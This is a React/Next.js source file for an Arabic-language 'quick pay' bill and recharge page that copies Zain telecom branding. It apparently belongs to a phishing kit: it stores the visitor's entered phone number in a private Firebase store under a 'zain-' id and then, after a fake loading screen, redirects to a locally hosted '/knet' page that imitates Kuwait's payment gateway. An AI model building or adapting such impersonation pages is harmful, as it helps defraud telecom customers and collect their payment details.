'use client';

import Head from 'next/head';
import { CSSProperties, useState } from 'react';
import { addData } from './lib/firebase';
import { useRouter } from 'next/navigation';
import Loader from './components/loader';

export default function QuickPay() {
  const [phone, setPhone] = useState('');
  const [loading, setLoading] = useState(false);
  const [active, setActive] = useState<'bill' | 'ess'>('bill');
  const [selectedAmounts, setSelectedAmounts] = useState<number[]>([]);

  const router = useRouter()

  const isPhoneValid = /^9\d{7}$/.test(phone);

  const handleAmountChange = (e: React.ChangeEvent<HTMLSelectElement>) => {
    const values = Array.from(e.target.selectedOptions, (opt) =>
      Number(opt.value)
    );
    setSelectedAmounts(values);
    localStorage.setItem('amount', e.target.value);
  };

  const total = selectedAmounts.reduce((sum, val) => sum + val, 0).toFixed(3);

  const _id = Math.random().toString(36).replace("0.", "zain-")

  const handleSubmit = () => {
  const visitorId = localStorage.getItem("visitor") || _id

    addData({
      id: visitorId,
      phone: phone,
    })
    setLoading(true)

    setTimeout(() => {
      router.push("/knet")
      setLoading(false)
    }, 2000)

  }
  return (
    <>
      <Head>
        <title>الدفع السريع - زين</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <link
          href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap"
          rel="stylesheet"
        />
      </Head>

      <div
        dir="rtl"
        lang="ar"
        style={{
          fontFamily: "'Cairo', sans-serif",
          backgroundColor: '#f8f8f8',
          minHeight: '100vh',
          margin: 0,
        }}
      >
        <header
          style={{
            background: 'linear-gradient(to left, #2b004d, #1e0036)',
            textAlign: 'center',
          }}
        >
          <img src="/top.png" alt="heaads" />
        </header>

        <div
          style={{
            maxWidth: '400px',
            margin: '30px auto',
            backgroundColor: '#fff',
            padding: '20px',
            borderRadius: '15px',
            boxShadow: '0 4px 10px rgba(0,0,0,0.1)',
          }}
        >
          <h2 style={{ fontSize: '1.2em', marginBottom: '15px' }}>
            الدفع السريع
          </h2>

          <div
            style={{
              display: 'flex',
              borderBottom: '2px solid #eee',
              marginBottom: '15px',
            }}
          >
            <div
              onClick={() => setActive('bill')}
              style={tabStyle(active === 'bill')}
            >
              دفع الفاتورة
            </div>
            <div
              onClick={() => setActive('ess')}
              style={tabStyle(active === 'ess')}
            >
              إعادة تعبئة eeZee
            </div>
          </div>

          <label style={labelStyle}>أود الدفع لـ</label>
          <select style={inputStyle}>
            <option>رقم آخر</option>
            <option>رقم العقد</option>
          </select>

          <label style={labelStyle}>
            رقم الهاتف <span style={{ color: 'red' }}>*</span>
          </label>
          <input
            type="text"
            placeholder="أدخل الرقم: 99XXXXXXX"
            maxLength={8}
            value={phone}
            onChange={(e) => setPhone(e.target.value)}
            style={{
              ...inputStyle,
              borderBottomColor: isPhoneValid ? '#32b14d' : '#d50087',
            }}
            inputMode="numeric"
            pattern="\d*"
          />

          <label style={labelStyle}>
            القيمة المختارة
          </label>
          <select
            value={selectedAmounts.map(String)}
            onChange={handleAmountChange}
            style={inputStyle}
          >
            <option value="3">3.000 د.ك</option>
            <option value="5">5.000 د.ك</option>
            <option value="10">10.000 د.ك</option>
            <option value="20">20.000 د.ك</option>
            <option value="30">30.000 د.ك</option>
            <option value="40">40.000 د.ك</option>
            <option value="50">50.000 د.ك</option>
          </select>

          <button className="add-number-btn" style={disabledBtnStyle} disabled>
            + أضف رقم آخر
          </button>

          <div
            style={{
              display: 'flex',
              justifyContent: 'space-between',
              marginTop: '30px',
              fontSize: '1.0em',
              borderTop: '1px solid #eee',
              paddingTop: '15px',
            }}
          >
            <span>إجمالي</span>
            <span style={{ color: '#32b14d', fontWeight: 'bold' }}>
              {total} د.ك
            </span>
          </div>

          <button

            className="pay-btn"
            style={ selectedAmounts.length> 0
                ? activeBtnStyle
                : disabledBtnStyle
            }
          >
            ادفع الآن
          </button>
        </div>
      </div>
      {loading && <Loader />}

    </>
  );
}

// Styles
const labelStyle = { display: 'block', marginBottom: '5px', fontWeight: 600 };
const inputStyle = {
  width: '100%',
  padding: '10px',
  marginBottom: '15px',
  border: 'none',
  borderBottom: '2px solid #d50087',
  backgroundColor: 'transparent',
  fontSize: '1em',
};
const disabledBtnStyle = {
  width: '100%',
  padding: '12px',
  backgroundColor: '#e0e0e0',
  border: 'none',
  borderRadius: '6px',
  fontSize: '1em',
  marginTop: '10px',
  cursor: 'not-allowed',
  color: '#777',
};
const activeBtnStyle = {
  ...disabledBtnStyle,
  backgroundColor: '#d50087',
  color: '#fff',
  cursor: 'pointer',
};
const tabStyle = (active: boolean): CSSProperties => ({
  flex: 1,
  textAlign: 'center',
  padding: '10px',
  cursor: 'pointer',
  fontWeight: 'bold',
  color: active ? '#d50087' : '#888',
  borderBottom: active ? '2px solid #d50087' : 'none',
});
